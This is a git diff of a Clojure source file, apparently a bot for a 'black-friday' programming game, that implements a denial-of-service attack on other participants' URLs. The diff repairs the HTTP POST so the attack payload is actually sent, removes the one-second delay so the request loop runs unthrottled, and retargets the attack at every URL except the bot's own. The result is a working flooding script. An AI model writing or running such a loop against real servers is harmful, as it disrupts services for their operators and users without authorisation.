@@ -2,9 +2,10 @@
   (:require [black-friday.bot.settings :as s]
             [clj-http.client :as client]
             [common.string :as xstr]
-            [clojure.set :as set]))
+            [clojure.set :as set]
+            [common.predicate :as p]))
 
-(def ^:private targets (agent {:active #{} :removed #{}}))
+(def targets (agent {:active #{} :removed #{}}))
 
 (def attack-request {:reason "dos",
                      :gameState
@@ -38,12 +39,11 @@
 
 (defn- attack [url]
   (try
-    (client/post (str url
-                      {:body          attack-request
-                       :content-type :json
-                       :as           :json}))
+    (client/post url {:form-params  attack-request
+                      :content-type :json
+                      :as           :json})
     (catch Throwable t))
-  (Thread/sleep 1000)
+  #_(Thread/sleep 1000)
   (when (not (contains? (:removed @targets) url)) (recur url)))
 
 (defn- update-targets-action [targets next-target-urls]
@@ -56,4 +56,4 @@
 (defn update-dos-targets [urls]
   (if (s/dos-attact-active?)
     (send targets update-targets-action
-           (set (filter (partial xstr/substring? (s/bot-url)) urls)))))
+          (set (filter (p/not* (partial xstr/substring? (s/bot-url))) urls)))))
